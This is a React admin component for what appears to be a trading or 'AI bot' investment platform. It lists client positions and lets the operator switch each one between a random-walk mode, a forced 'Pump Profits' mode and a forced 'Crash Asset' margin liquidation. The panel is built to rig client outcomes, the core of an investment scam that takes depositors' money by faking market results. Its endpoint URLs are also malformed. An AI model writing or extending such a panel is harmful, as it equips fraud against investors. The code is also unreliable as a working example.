'use strict';

import React, { useEffect, useState } from 'react';

interface ActivePosition {
  id: number;
  client: string;
  asset: string;
  margin: number;
  mode: 'normal' | 'profit' | 'loss';
}

export default function YieldController() {
  const [positions, setPositions] = useState<ActivePosition[]>([]);
  const [updatingId, setUpdatingId] = useState<number | null>(null);

  // Sync positions feed tracking channels loop execution
  const loadPositions = async () => {
    try {
      const res = await fetch('https://onrender.comadmin_get_positions.php');
      const data = await res.json();
      if (Array.isArray(data)) {
        setPositions(data);
      }
    } catch (err) {
      console.error("Failed to read active user positions data arrays:", err);
    }
  };

  useEffect(() => {
    loadPositions();
    const interval = setInterval(loadPositions, 6000); // Auto-refresh table listings rows every 6s
    return () => clearInterval(interval);
  }, []);

  // Handle vector updating dropdown action triggers
  const handleVectorChange = async (userId: string, positionId: number, targetVector: 'normal' | 'profit' | 'loss') => {
    setUpdatingId(positionId);
    try {
      const formData = new FormData();
      formData.append("user_id", userId);
      formData.append("mode", targetVector);

      const res = await fetch('https://onrender.comadmin_update_vector.php', {
        method: "POST",
        body: formData
      });
      const result = await res.json();
      
      if (result.status === "success") {
        // Optimistically update status parameters internally across states to reflect updates instantly
        setPositions(prev => prev.map(p => p.id === positionId ? { ...p, mode: targetVector } : p));
      } else {
        alert("Server failed to commit yield state parameters.");
      }
    } catch (err) {
      console.error("Network communication exception: ", err);
    } finally {
      setUpdatingId(null);
    }
  };

  return (
    <div className="w-full bg-[#161b26]/40 border border-slate-800/80 rounded-xl p-5 mt-4">
      {positions.length === 0 ? (
        <div className="text-center text-xs font-mono text-slate-500 py-8 border border-dashed border-slate-800 rounded-lg">
          No active client running positions or contracts found in tracking channels ledger rows index.
        </div>
      ) : (
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse">
            <thead>
              <tr className="border-b border-slate-800 text-slate-400 font-mono uppercase text-[10px] tracking-wider">
                <th className="pb-3 px-2">Position ID</th>
                <th className="pb-3">Client Profile</th>
                <th className="pb-3">Target Asset</th>
                <th className="pb-3">Margin Value</th>
                <th className="pb-3">Type</th>
                <th className="pb-3 text-right pr-4">Yield Vector Mode Control Switcher</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/40 text-slate-200">
              {positions.map((pos) => (
                <tr key={pos.id} className="hover:bg-slate-800/10 transition-all font-medium">
                  <td className="py-3 px-2 font-mono text-slate-400 text-[11px]">#POS-{pos.id}</td>
                  <td className="py-3 font-bold text-slate-300 truncate max-w-[140px]" title={pos.client}>{pos.client}</td>
                  <td className="py-3 font-mono text-orange-400 text-xs font-black">{pos.asset}</td>
                  <td className="py-3 font-mono text-emerald-400 font-semibold">${pos.margin.toLocaleString(undefined, { minimumFractionDigits: 2 })}</td>
                  <td className="py-3">
                    <span className={`px-2 py-0.5 rounded-[4px] text-[9px] font-bold uppercase ${
                      pos.asset.includes('BOT') ? 'bg-purple-950/60 text-purple-400 border border-purple-800/40' : 'bg-blue-950/60 text-blue-400 border border-blue-800/40'
                    }`}>
                      {pos.asset.includes('BOT') ? 'AI Bot Contract' : 'Market Spot'}
                    </span>
                  </td>
                  <td className="py-3 text-right pr-2">
                    <select
                      value={pos.mode}
                      disabled={updatingId === pos.id}
                      onChange={(e) => handleVectorChange(pos.client, pos.id, e.target.value as any)}
                      className={`px-3 py-1.5 rounded-lg border text-xs font-bold transition focus:outline-none ${
                        pos.mode === 'profit' 
                          ? 'bg-emerald-950/80 border-emerald-500 text-emerald-400' 
                          : pos.mode === 'loss' 
                          ? 'bg-rose-950/80 border-rose-500 text-rose-400' 
                          : 'bg-slate-900 border-slate-700 text-slate-300'
                      } disabled:opacity-40 cursor-pointer`}
                    >
                      <option value="normal">Normal Yield (Random walk Mode)</option>
                      <option value="profit">Force High Return Vectors (Pump Profits 📈)</option>
                      <option value="loss">Trigger Force Margin Liquidation (Crash Asset 📉)</option>
                    </select>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}